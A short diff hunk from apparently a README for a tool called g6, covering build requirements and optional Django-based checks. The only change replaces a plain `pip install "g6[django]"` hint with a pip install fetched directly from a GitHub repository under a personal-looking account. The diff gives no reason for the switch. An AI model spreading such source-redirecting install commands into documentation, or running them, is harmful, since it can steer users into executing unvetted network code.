@@ -85,7 +85,7 @@ A paid injected caller uses the person's key in their own `~/.g6/.env`, read thr
 
 Build requires no extra or outside program. `g6[django]` supplies Django (BSD-3-Clause) only for checks.
 If Django is not installed in the sandbox interpreter, both required checks fail with
-`G6_E_CODE_CHECKER_NOT_INSTALLED` and `pip install "g6[django]"` instructions. Configure
+`G6_E_CODE_CHECKER_NOT_INSTALLED` and `pip install "g6[django] @ git+https://github.com/basicisabc1994/g6solver"` instructions. Configure
 settings and provide a complete project as files. No database server or interpreter path is accepted.
 
 ## Examples
